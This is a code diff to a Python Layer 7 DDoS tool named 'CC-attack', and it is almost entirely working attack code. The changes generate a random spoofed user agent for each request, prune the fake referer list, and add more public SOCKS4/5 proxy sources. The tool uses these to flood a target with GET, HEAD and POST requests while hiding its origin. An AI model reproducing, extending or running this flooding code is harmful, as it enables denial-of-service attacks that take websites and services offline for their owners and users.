@@ -19,28 +19,26 @@ import datetime
 
 
 print ('''
-       /////    /////    /////////////
-      CCCCC/   CCCCC/   | CC-attack |/
-     CC/      CC/       |-----------|/ 
-     CC/      CC/       |  Layer 7  |/ 
-     CC/////  CC/////   | ddos tool |/ 
-      CCCCC/   CCCCC/   |___________|/
+	   /////    /////    /////////////
+	  CCCCC/   CCCCC/   | CC-attack |/
+	 CC/      CC/       |-----------|/ 
+	 CC/      CC/       |  Layer 7  |/ 
+	 CC/////  CC/////   | ddos tool |/ 
+	  CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 3.3 
-                            C0d3d by L330n123
+Python3 version 3.4 
+							C0d3d by L330n123
 ┌─────────────────────────────────────────────┐
 │        Tos: Don't attack .gov website       │
 ├─────────────────────────────────────────────┤
 │                 New stuff:                  │
+|          + Added new socks4/5 api           |
+|          + Removed useless function         |
 │          + Customize Cookies                │
 │          + Customize data of post mode      │
-│          + Fast Port Re-use                 │
-│          + Added Random client ip           │
 ├─────────────────────────────────────────────┤
 │ Link: https://github.com/Leeon123/CC-attack │
 └─────────────────────────────────────────────┘''')
-
-useragents = []
 
 acceptall = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
@@ -67,10 +65,6 @@ referers = [
 	"https://www.bing.com/search?q=",
 	"https://r.search.yahoo.com/",
 	"https://www.cia.gov/index.html",
-	"https://www.police.gov.hk/",
-	"https://www.mjib.gov.tw/",
-	"https://www.president.gov.tw/",
-	"https://www.gov.hk",
 	"https://vk.com/profile.php?redirect=",
 	"https://www.usatoday.com/search/results?q=",
 	"https://help.baidu.com/searchResult?keywords=",
@@ -102,48 +96,44 @@ def build_threads(mode,thread_num,event,socks_type):
 			th.setDaemon(True)
 			th.start()
 
-def create_useragents(threads):
-	for _ in range(threads):
-		useragents.append(getuseragent())
-
 def getuseragent():
-    platform = Choice(['Macintosh', 'Windows', 'X11'])
-    if platform == 'Macintosh':
-        os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])
-    elif platform == 'Windows':
-        os  = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
-    elif platform == 'X11':
-        os  = Choice(['Linux i686', 'Linux x86_64'])
-    browser = Choice(['chrome', 'firefox', 'ie'])
-    if browser == 'chrome':
-        webkit = str(Intn(500, 599))
-        version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
-        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
-    elif browser == 'firefox':
-        currentYear = datetime.date.today().year
-        year = str(Intn(2020, currentYear))
-        month = Intn(1, 12)
-        if month < 10:
-            month = '0' + str(month)
-        else:
-            month = str(month)
-        day = Intn(1, 30)
-        if day < 10:
-            day = '0' + str(day)
-        else:
-            day = str(day)
-        gecko = year + month + day
-        version = str(Intn(1, 72)) + '.0'
-        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
-    elif browser == 'ie':
-        version = str(Intn(1, 99)) + '.0'
-        engine = str(Intn(1, 99)) + '.0'
-        option = Choice([True, False])
-        if option == True:
-            token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
-        else:
-            token = ''
-        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
+	platform = Choice(['Macintosh', 'Windows', 'X11'])
+	if platform == 'Macintosh':
+		os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])
+	elif platform == 'Windows':
+		os  = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
+	elif platform == 'X11':
+		os  = Choice(['Linux i686', 'Linux x86_64'])
+	browser = Choice(['chrome', 'firefox', 'ie'])
+	if browser == 'chrome':
+		webkit = str(Intn(500, 599))
+		version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
+		return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
+	elif browser == 'firefox':
+		currentYear = datetime.date.today().year
+		year = str(Intn(2020, currentYear))
+		month = Intn(1, 12)
+		if month < 10:
+			month = '0' + str(month)
+		else:
+			month = str(month)
+		day = Intn(1, 30)
+		if day < 10:
+			day = '0' + str(day)
+		else:
+			day = str(day)
+		gecko = year + month + day
+		version = str(Intn(1, 72)) + '.0'
+		return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
+	elif browser == 'ie':
+		version = str(Intn(1, 99)) + '.0'
+		engine = str(Intn(1, 99)) + '.0'
+		option = Choice([True, False])
+		if option == True:
+			token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
+		else:
+			token = ''
+		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
 
 def randomurl():
 	 return str(Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings) + Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings))
@@ -154,7 +144,7 @@ def cc(event,socks_type):
 		connection += "Cookies: "+str(cookies)+"\r\n"
 	accept = Choice(acceptall)
 	referer = "Referer: "+Choice(referers)+ ip + url2 + "\r\n"
-	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+	useragent = "User-Agent: " + getuseragent() + "\r\n"
 	proxy = Choice(proxies).strip().split(":")
 	event.wait()
 	while True:
@@ -187,7 +177,7 @@ def head(event,socks_type):#HEAD MODE
 		connection += "Cookies: "+str(cookies)+"\r\n"
 	accept = Choice(acceptall)
 	referer = "Referer: "+Choice(referers)+ ip + url2 + "\r\n"
-	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+	useragent = "User-Agent: " + getuseragent() + "\r\n"
 	proxy = Choice(proxies).strip().split(":")
 	event.wait()
 	while True:
@@ -219,7 +209,7 @@ def post(event,socks_type):
 	post_host = "POST " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 	content = "Content-Type: application/x-www-form-urlencoded\r\n"
 	refer = "Referer: http://"+ ip + url2 + "\r\n"
-	user_agent = "User-Agent: " + random.choice(useragents) + "\r\n"
+	user_agent = "User-Agent: " + getuseragent() + "\r\n"
 	accept = Choice(acceptall)
 	if mode2 != "y":
 		data = str(random._urandom(16)) # You can enable bring data in HTTP Header
@@ -400,19 +390,29 @@ def downloadsocks(choice):
 	if choice == "4":
 		f = open("socks4.txt",'wb')
 		try:
-			r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all")
+			r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",timeout=5)
 			f.write(r.content)
 		except:
 			pass
 		try:
-			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4")
+			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4",timeout=5)
 			f.write(r.content)
 		except:
 			pass
-		f.close()
+		try:
+			r = requests.get("https://www.proxyscan.io/download?type=socks4",timeout=5)
+			f.write(r.content)
+		except:
+			pass
+		try:
+			r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",timeout=5)
+			f.write(r.content)
+			f.close()
+		except:
+			f.close()
 		try:#credit to All3xJ
 			import urllib.request
-			req = urllib.request.Request("https://www.socks-proxy.net/")
+			req = urllib.request.Request("https://www.socks-proxy.net/",timeout=5)
 			req.add_header("User-Agent", getuseragent)
 			sourcecode = urllib.request.urlopen(req)
 			part = str(sourcecode.read())
@@ -435,12 +435,29 @@ def downloadsocks(choice):
 	if choice == "5":
 		f = open("socks5.txt",'wb')
 		try:
-			r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all")
+			r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all",timeout=5)
 			f.write(r.content)
 		except:
 			pass
 		try:
-			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5")
+			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5",timeout=5)
+			f.write(r.content)
+			f.close()
+		except:
+			pass
+		try:
+			r = requests.get("https://www.proxyscan.io/download?type=socks5",timeout=5)
+			f.write(r.content)
+			f.close()
+		except:
+			pass
+		try:
+			r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",timeout=5)
+			f.write(r.content)
+		except:
+			pass
+		try:
+			r = requests.get("https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",timeout=5)
 			f.write(r.content)
 			f.close()
 		except:
@@ -560,7 +577,6 @@ def main():
 			thread_num = int(thread_num)
 		except:
 			sys.exit("Error thread number")
-	create_useragents(thread_num)
 	N = str(input("> Do you need to get socks list?(y/n,default=y):"))
 	if N == 'y' or N == "" :
 		downloadsocks(choice)
